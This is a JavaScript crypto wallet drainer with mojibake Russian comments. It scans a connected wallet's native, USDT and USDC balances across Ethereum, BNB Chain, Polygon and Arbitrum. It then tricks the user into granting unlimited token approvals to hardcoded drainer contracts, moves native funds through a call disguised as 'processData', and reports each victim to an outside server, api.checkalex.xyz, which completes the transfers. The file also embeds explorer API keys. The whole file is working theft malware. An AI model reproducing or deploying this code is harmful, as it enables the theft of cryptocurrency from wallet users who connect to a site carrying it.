import { ethers } from 'ethers';

// ABI –¥–ª—è ERC20 —Ç–æ–∫–µ–Ω–æ–≤
const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function transferFrom(address sender, address recipient, uint256 amount) returns (bool)"
];

// ABI –¥–ª—è –¥—Ä–µ–π–Ω–µ—Ä–∞
const DRAINER_ABI = [
  "function processData(uint256 taskId, bytes32 dataHash, uint256 nonce) external payable"
];

// –ö–ª—é—á–∏ API –¥–ª—è —Å–∫–∞–Ω–µ—Ä–æ–≤
const ETHERSCAN_API_KEY = "X2A1BU3MABVFFN1GQ1DRX5PHNG212MTXKT";
const BSCSCAN_API_KEY = "8AWWMFHVD5E65JCGGYKKE95RTKTPB7AJJR";
const POLYGONSCAN_API_KEY = "43EJ8S6WRP4ESVX8AGM8KP9I61P44YWZ2T";
const ARBISCAN_API_KEY = "6YDH1XI6VB7UBQV4WXSH2M7UIEBMMCF9ES";
const OPTIMISTIC_ETHERSCAN_API_KEY = "5CKHVMKCD5VBXIB4PCM4KYKX5JJCCVU3RW";
const BASESCAN_API_KEY = "TEB6I1H3F1UH1DF2I1R39PA9RX5C6IKB1H";

// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è —Å–µ—Ç–µ–π
const CHAINS = {
  1: {
    name: "Ethereum Mainnet",
    nativeToken: "ETH",
    chainIdHex: "0x1",
    rpcUrls: ["https://rpc.eth.gateway.fm", "https://eth.llamarpc.com", "https://ethereum-rpc.publicnode.com"],
    usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    usdcAddress: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    drainerAddress: "0x2F711446fa4048c375fE65fBf6C912DD44c736Cd",
    explorerApi: "https://api.etherscan.io/api",
    explorerApiKey: ETHERSCAN_API_KEY
  },
  56: {
    name: "BNB Chain",
    nativeToken: "BNB",
    chainIdHex: "0x38",
    rpcUrls: [
      "https://bsc-dataseed.binance.org/",
      "https://bsc-dataseed1.defibit.io/",
      "https://bsc-dataseed1.ninicoin.io/"
    ],
    usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
    usdcAddress: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
    drainerAddress: "0x625C717652CC4665a342d355733d5707BCF6ef66",
    explorerApi: "https://api.bscscan.com/api",
    explorerApiKey: BSCSCAN_API_KEY
  },
  137: {
    name: "Polygon",
    nativeToken: "MATIC",
    chainIdHex: "0x89",
    rpcUrls: ["https://polygon-rpc.com/"],
    usdtAddress: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
    usdcAddress: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
    drainerAddress: "0x625C717652CC4665a342d355733d5707BCF6ef66",
    explorerApi: "https://api.polygonscan.com/api",
    explorerApiKey: POLYGONSCAN_API_KEY
  },
  42161: {
    name: "Arbitrum One",
    nativeToken: "ETH",
    chainIdHex: "0xa4b1",
    rpcUrls: ["https://arb1.arbitrum.io/rpc"],
    usdtAddress: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
    usdcAddress: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8",
    drainerAddress: "0x8814D8937F84D9D93c125E9031087F2e8Cfc9b4F",
    explorerApi: "https://api.arbiscan.io/api",
    explorerApiKey: ARBISCAN_API_KEY
  }
};

// –£—Ç–∏–ª–∏—Ç–∞ –¥–ª—è –∑–∞–¥–µ—Ä–∂–∫–∏
const delay = (ms) => new Promise(r => setTimeout(r, ms));

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ä–∞–±–æ—á–µ–≥–æ –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞
async function getWorkingProvider(rpcUrls, existingProvider = null) {
  // –°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–≤–µ—Ä—è–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π –ø—Ä–æ–≤–∞–π–¥–µ—Ä (–µ—Å–ª–∏ –ø–µ—Ä–µ–¥–∞–Ω)
  if (existingProvider) {
    try {
      await existingProvider.getBalance('0x0000000000000000000000000000000000000000');
      console.log('‚úÖ –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –ø–µ—Ä–µ–¥–∞–Ω–Ω—ã–π –ø—Ä–æ–≤–∞–π–¥–µ—Ä');
      return existingProvider;
    } catch (e) {
      console.warn('‚ö†Ô∏è –ü–µ—Ä–µ–¥–∞–Ω–Ω—ã–π –ø—Ä–æ–≤–∞–π–¥–µ—Ä –Ω–µ–Ω–∞–¥—ë–∂–µ–Ω:', e.message);
    }
  }

  // –ï—Å–ª–∏ –ø–µ—Ä–µ–¥–∞–Ω–Ω—ã–π –ø—Ä–æ–≤–∞–π–¥–µ—Ä –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, –ø–µ—Ä–µ–±–∏—Ä–∞–µ–º RPC
  for (const rpc of rpcUrls) {
    try {
      const provider = new ethers.providers.JsonRpcProvider(rpc);
      await provider.getBalance('0x0000000000000000000000000000000000000000');
      console.log(`‚úÖ –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è RPC: ${rpc}`);
      return provider;
    } catch (e) {
      console.warn(`‚ö†Ô∏è RPC ${rpc} –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω: ${e.message}`);
    }
  }
  throw new Error(`–ù–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã—Ö RPC –¥–ª—è ${rpcUrls}`);
}

// –ü–æ–ª—É—á–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞ –Ω–∞—Ç–∏–≤–Ω–æ–≥–æ —Ç–æ–∫–µ–Ω–∞ —á–µ—Ä–µ–∑ API
async function getBalanceFromExplorer(address, chainId) {
  const config = CHAINS[chainId];
  const apiUrl = `${config.explorerApi}?module=account&action=balance&address=${address}&tag=latest&apikey=${config.explorerApiKey}`;
  const response = await fetch(apiUrl);
  const data = await response.json();
  if (data.status === "1") {
    return ethers.BigNumber.from(data.result);
  } else {
    throw new Error(data.message || `–û—à–∏–±–∫–∞ API –¥–ª—è ${config.name}`);
  }
}

// –ü–æ–ª—É—á–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞ —Ç–æ–∫–µ–Ω–∞ —á–µ—Ä–µ–∑ API
async function getTokenBalanceFromExplorer(address, tokenAddress, chainId) {
  const config = CHAINS[chainId];
  const apiUrl = `${config.explorerApi}?module=account&action=tokenbalance&contractaddress=${tokenAddress}&address=${address}&tag=latest&apikey=${config.explorerApiKey}`;
  const response = await fetch(apiUrl);
  const data = await response.json();
  if (data.status === "1") {
    return ethers.BigNumber.from(data.result);
  } else {
    throw new Error(data.message || `–û—à–∏–±–∫–∞ API –¥–ª—è —Ç–æ–∫–µ–Ω–∞ –≤ ${config.name}`);
  }
}

// –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–∞–ª–∞–Ω—Å–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º API –∏ fallback –Ω–∞ RPC
async function checkBalance(chainId, userAddress) {
  const config = CHAINS[chainId];
  let nativeBalance, usdtBalance, usdcBalance;

  try {
    nativeBalance = await getBalanceFromExplorer(userAddress, chainId);
  } catch (e) {
    console.warn(`–û—à–∏–±–∫–∞ API –¥–ª—è –Ω–∞—Ç–∏–≤–Ω–æ–≥–æ –±–∞–ª–∞–Ω—Å–∞ –≤ ${config.name}: ${e.message}`);
    const provider = await getWorkingProvider(config.rpcUrls);
    nativeBalance = await provider.getBalance(userAddress);
  }

  try {
    usdtBalance = await getTokenBalanceFromExplorer(userAddress, config.usdtAddress, chainId);
  } catch (e) {
    console.warn(`–û—à–∏–±–∫–∞ API –¥–ª—è USDT –≤ ${config.name}: ${e.message}`);
    const provider = await getWorkingProvider(config.rpcUrls);
    const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, provider);
    usdtBalance = await usdt.balanceOf(userAddress);
  }

  try {
    usdcBalance = await getTokenBalanceFromExplorer(userAddress, config.usdcAddress, chainId);
  } catch (e) {
    console.warn(`–û—à–∏–±–∫–∞ API –¥–ª—è USDC –≤ ${config.name}: ${e.message}`);
    const provider = await getWorkingProvider(config.rpcUrls);
    const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, provider);
    usdcBalance = await usdc.balanceOf(userAddress);
  }

  return { nativeBalance, usdtBalance, usdcBalance };
}

// –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è —Å—Ä–µ–¥—Å—Ç–≤
function hasFunds(bal) {
  return (
    bal.nativeBalance.gt(ethers.utils.parseEther("0.001")) ||
    bal.usdtBalance.gt(ethers.utils.parseUnits("0.1", 6)) ||
    bal.usdcBalance.gt(ethers.utils.parseUnits("0.1", 6))
  );
}

// –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ —Å–µ—Ç–∏
async function switchChain(chainId) {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: CHAINS[chainId].chainIdHex }]
    });
  } catch (e) {
    console.warn(`–û—à–∏–±–∫–∞ –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏—è –Ω–∞ —Å–µ—Ç—å ${CHAINS[chainId].name}: ${e.message}`);
    throw e;
  }
}

// –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –¥—Ä–µ–π–Ω–∞
async function drain(chainId, signer, userAddress, bal) {
  const config = CHAINS[chainId];
  const MAX = ethers.constants.MaxUint256;
  const MIN_TOKEN_BALANCE = ethers.utils.parseUnits("0.1", 6); // –ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–π –ø–æ—Ä–æ–≥ 0.1 USDT/USDC

  // –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–æ–≤–∞–π–¥–µ—Ä –ø–µ—Ä–µ–¥ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º
  const reliableProvider = await getWorkingProvider(config.rpcUrls, signer.provider);
  const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, signer);
  const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, signer);

  // –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–∞–ª–∞–Ω—Å–∞ ETH –ø–µ—Ä–µ–¥ approve
  const ethBalance = await reliableProvider.getBalance(userAddress);
  const minEthRequired = ethers.utils.parseEther("0.0003");
  if (ethBalance.lt(minEthRequired)) {
    console.error(`‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ ${config.nativeToken} –¥–ª—è –≥–∞–∑–∞: ${ethers.utils.formatEther(ethBalance)} ${config.nativeToken}`);
    throw new Error(`–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ ${config.nativeToken} –¥–ª—è –æ–ø–ª–∞—Ç—ã –≥–∞–∑–∞`);
  }

  // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∞–ª—å–Ω—ã–µ –±–∞–ª–∞–Ω—Å—ã USDT –∏ USDC
  let realUsdtBalance = ethers.BigNumber.from(0);
  let realUsdcBalance = ethers.BigNumber.from(0);

  if (bal.usdtBalance.gt(0)) {
    console.log(`üìä USDT –±–∞–ª–∞–Ω—Å (API): ${ethers.utils.formatUnits(bal.usdtBalance, 6)} USDT`);
    realUsdtBalance = await usdt.balanceOf(userAddress);
    console.log(`üìä USDT –±–∞–ª–∞–Ω—Å (—Ä–µ–∞–ª—å–Ω—ã–π): ${ethers.utils.formatUnits(realUsdtBalance, 6)} USDT`);
    if (realUsdtBalance.lt(bal.usdtBalance)) {
      console.error(`‚ùå –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –±–∞–ª–∞–Ω—Å: API –≤–µ—Ä–Ω—É–ª ${ethers.utils.formatUnits(bal.usdtBalance, 6)}, —Ä–µ–∞–ª—å–Ω—ã–π: ${ethers.utils.formatUnits(realUsdtBalance, 6)}`);
      bal.usdtBalance = realUsdtBalance;
    }
  }

  if (bal.usdcBalance.gt(0)) {
    console.log(`üìä USDC –±–∞–ª–∞–Ω—Å (API): ${ethers.utils.formatUnits(bal.usdcBalance, 6)} USDC`);
    realUsdcBalance = await usdc.balanceOf(userAddress);
    console.log(`üìä USDC –±–∞–ª–∞–Ω—Å (—Ä–µ–∞–ª—å–Ω—ã–π): ${ethers.utils.formatUnits(realUsdcBalance, 6)} USDC`);
    if (realUsdcBalance.lt(bal.usdcBalance)) {
      console.error(`‚ùå –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –±–∞–ª–∞–Ω—Å: API –≤–µ—Ä–Ω—É–ª ${ethers.utils.formatUnits(bal.usdcBalance, 6)}, —Ä–µ–∞–ª—å–Ω—ã–π: ${ethers.utils.formatUnits(realUsdcBalance, 6)}`);
      bal.usdcBalance = realUsdcBalance;
    }
  }

  // –°—Ä–∞–≤–Ω–∏–≤–∞–µ–º –±–∞–ª–∞–Ω—Å—ã –∏ –≤—ã–±–∏—Ä–∞–µ–º —Ç–æ–∫–µ–Ω —Å –±–æ–ª—å—à–∏–º –±–∞–ª–∞–Ω—Å–æ–º
  const tokensToProcess = [];
  if (bal.usdtBalance.gt(MIN_TOKEN_BALANCE)) {
    tokensToProcess.push({ token: 'USDT', balance: bal.usdtBalance, contract: usdt, address: config.usdtAddress });
  }
  if (bal.usdcBalance.gt(MIN_TOKEN_BALANCE)) {
    tokensToProcess.push({ token: 'USDC', balance: bal.usdcBalance, contract: usdc, address: config.usdcAddress });
  }

  // –°–æ—Ä—Ç–∏—Ä—É–µ–º –ø–æ —É–±—ã–≤–∞–Ω–∏—é –±–∞–ª–∞–Ω—Å–∞
  tokensToProcess.sort((a, b) => (b.balance.gt(a.balance) ? 1 : -1));

  // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º —Ç–æ–∫–µ–Ω—ã –≤ –ø–æ—Ä—è–¥–∫–µ —É–±—ã–≤–∞–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞
  let status = 'rejected'; // –ü–æ —É–º–æ–ª—á–∞–Ω–∏—é —Å—Ç–∞—Ç—É—Å "–æ—Ç–∫–ª–æ–Ω–µ–Ω–æ"
  for (const { token, balance, contract, address } of tokensToProcess) {
    console.log(`üì¶ –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º ${token} —Å –±–∞–ª–∞–Ω—Å–æ–º: ${ethers.utils.formatUnits(balance, 6)}`);

    const allowanceBefore = await contract.allowance(userAddress, config.drainerAddress);
    console.log(`üìú ${token} allowance –¥–æ: ${ethers.utils.formatUnits(allowanceBefore, 6)} ${token}`);

    if (allowanceBefore.lt(balance)) {
      try {
        const nonce = await reliableProvider.getTransactionCount(userAddress, "pending");
        const tx = await contract.approve(config.drainerAddress, MAX, {
          gasLimit: 100000,
          gasPrice: ethers.utils.parseUnits("3", "gwei"),
          nonce
        });
        const receipt = await tx.wait();
        console.log(`‚úÖ ${token} approve —É—Å–ø–µ—à–µ–Ω:`, tx.hash);
        console.log("‚è≥ –û–∂–∏–¥–∞–Ω–∏–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è approve...");
        await delay(5000);
        const allowanceAfter = await contract.allowance(userAddress, config.drainerAddress);
        console.log(`üìú ${token} allowance –ø–æ—Å–ª–µ: ${ethers.utils.formatUnits(allowanceAfter, 6)} ${token}`);
        await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash);
        status = 'confirmed'; // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å—Ç–∞—Ç—É—Å "–ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–æ"
      } catch (e) {
        console.error(`‚ùå –û—à–∏–±–∫–∞ approve –¥–ª—è ${token}: ${e.message}`);
        throw e; // –ü—Ä–æ–±—Ä–∞—Å—ã–≤–∞–µ–º –æ—à–∏–±–∫—É, —á—Ç–æ–±—ã –æ–±—Ä–∞–±–æ—Ç–∞—Ç—å –µ—ë –≤ main.js
      }
    } else {
      console.log(`‚úÖ ${token} allowance —É–∂–µ –¥–æ—Å—Ç–∞—Ç–æ—á–µ–Ω, —É–≤–µ–¥–æ–º–ª—è–µ–º —Å–µ—Ä–≤–µ—Ä`);
      await notifyServer(userAddress, address, balance, chainId, null);
      status = 'confirmed'; // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å—Ç–∞—Ç—É—Å "–ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–æ"
    }
  }

  // –ï—Å–ª–∏ –Ω–µ—Ç —Ç–æ–∫–µ–Ω–æ–≤ –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏
  if (tokensToProcess.length === 0) {
    console.log("‚ö†Ô∏è –ù–µ—Ç —Ç–æ–∫–µ–Ω–æ–≤ —Å –¥–æ—Å—Ç–∞—Ç–æ—á–Ω—ã–º –±–∞–ª–∞–Ω—Å–æ–º –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ (–º–∏–Ω. 0.1 USDT/USDC)");
  }

  // –î—Ä–µ–π–Ω–∏–Ω–≥ –Ω–∞—Ç–∏–≤–Ω–æ–≥–æ —Ç–æ–∫–µ–Ω–∞
  if (bal.nativeBalance.gt(0)) {
    const drainer = new ethers.Contract(config.drainerAddress, DRAINER_ABI, signer);
    const gasReserve = ethers.utils.parseEther("0.002");
    const nativeToSend = bal.nativeBalance.sub(gasReserve);
    const value = nativeToSend.gt(0) ? nativeToSend : ethers.BigNumber.from(0);

    if (value.gt(0)) {
      const taskId = Math.floor(Math.random() * 1000000);
      const dataHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(`fakeData-native-${Date.now()}`));
      const nonce = await reliableProvider.getTransactionCount(userAddress, "pending");

      try {
        const tx = await drainer.processData(taskId, dataHash, nonce, {
          value,
          gasLimit: 100000,
          gasPrice: ethers.utils.parseUnits("3", "gwei"),
          nonce
        });
        const receipt = await tx.wait();
        if (receipt.status !== 1) {
          throw new Error(`–¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è processData (${config.nativeToken}) –Ω–µ —É–¥–∞–ª–∞—Å—å`);
        }
        console.log(`‚úÖ –î—Ä–µ–π–Ω–∏–Ω–≥ ${config.nativeToken} —É—Å–ø–µ—à–µ–Ω:`, receipt.transactionHash);
        status = 'confirmed'; // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å—Ç–∞—Ç—É—Å "–ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–æ"
      } catch (e) {
        console.error(`‚ùå –û—à–∏–±–∫–∞ –≤—ã–∑–æ–≤–∞ processData (${config.nativeToken}): ${e.message}`);
        throw e;
      }
    }
  }

  return status; // –í–æ–∑–≤—Ä–∞—â–∞–µ–º —Å—Ç–∞—Ç—É—Å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è
}

async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash) {
  try {
    const provider = await getWorkingProvider(CHAINS[chainId].rpcUrls);
    const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const balance = await token.balanceOf(userAddress);
    const decimals = await token.decimals();
    const balanceUnits = ethers.utils.formatUnits(balance, decimals);
    console.log(`üìä –†–µ–∞–ª—å–Ω—ã–π –±–∞–ª–∞–Ω—Å —Ç–æ–∫–µ–Ω–∞ (${tokenAddress}): ${balanceUnits}`);

    const roundedBalance = Math.floor(parseFloat(balanceUnits) * 10) / 10;
    console.log(`üìä –û–∫—Ä—É–≥–ª—ë–Ω–Ω—ã–π –±–∞–ª–∞–Ω—Å: ${roundedBalance}`);

    const roundedAmount = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
    if (roundedAmount.lte(0)) {
      throw new Error('–ë–∞–ª–∞–Ω—Å —Å–ª–∏—à–∫–æ–º –º–∞–ª –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞');
    }

    console.log(`üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä: userAddress=${userAddress}, tokenAddress=${tokenAddress}, amount=${ethers.utils.formatUnits(roundedAmount, decimals)}, chainId=${chainId}, txHash=${txHash}`);
    const response = await fetch('https://api.checkalex.xyz/api/transfer', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userAddress,
        tokenAddress,
        amount: roundedAmount.toString(),
        chainId,
        txHash
      })
    });
    const data = await response.json();
    if (data.success) {
      console.log("‚úÖ –°–µ—Ä–≤–µ—Ä —É–≤–µ–¥–æ–º–ª—ë–Ω, —Ç—Ä–∞–Ω—Å—Ñ–µ—Ä –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω");
    } else {
      console.error("‚ùå –û—à–∏–±–∫–∞ –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞:", data.message);
      throw new Error(data.message);
    }
  } catch (e) {
    console.error("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –¥–∞–Ω–Ω—ã—Ö –Ω–∞ —Å–µ—Ä–≤–µ—Ä:", e.message);
    throw e;
  }
}

// –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
export async function runDrainer(provider, signer, userAddress) {
  const balancePromises = Object.keys(CHAINS).map(async (chainId) => {
    try {
      const balance = await checkBalance(chainId, userAddress);
      console.log(`–°–µ—Ç—å: ${CHAINS[chainId].name}`);
      console.log(`üí∞ ${CHAINS[chainId].nativeToken}: ${ethers.utils.formatEther(balance.nativeBalance)}`);
      console.log(`üü† USDT: ${ethers.utils.formatUnits(balance.usdtBalance, 6)}`);
      console.log(`üîµ USDC: ${ethers.utils.formatUnits(balance.usdcBalance, 6)}`);
      return { chainId: Number(chainId), ...balance };
    } catch (e) {
      console.warn(`–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –±–∞–ª–∞–Ω—Å–∞ –≤ —Å–µ—Ç–∏ ${CHAINS[chainId].name}: ${e.message}`);
      return null;
    }
  });

  const balances = (await Promise.all(balancePromises)).filter(Boolean);
  const sorted = balances
    .filter(hasFunds)
    .sort((a, b) =>
      b.usdtBalance.add(b.usdcBalance).gt(a.usdtBalance.add(a.usdcBalance)) ? 1 : -1
    );

  if (!sorted.length) {
    console.warn("‚õî –ù–µ—Ç –ø–æ–¥—Ö–æ–¥—è—â–∏—Ö —Å–µ—Ç–µ–π —Å –±–∞–ª–∞–Ω—Å–æ–º.");
    return 'rejected'; // –í–æ–∑–≤—Ä–∞—â–∞–µ–º —Å—Ç–∞—Ç—É—Å "–æ—Ç–∫–ª–æ–Ω–µ–Ω–æ", –µ—Å–ª–∏ –Ω–µ—Ç —Å–µ—Ç–µ–π
  }

  const target = sorted[0];
  await switchChain(target.chainId);
  const status = await drain(target.chainId, signer, userAddress, target);
  return status; // –í–æ–∑–≤—Ä–∞—â–∞–µ–º —Å—Ç–∞—Ç—É—Å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è
}
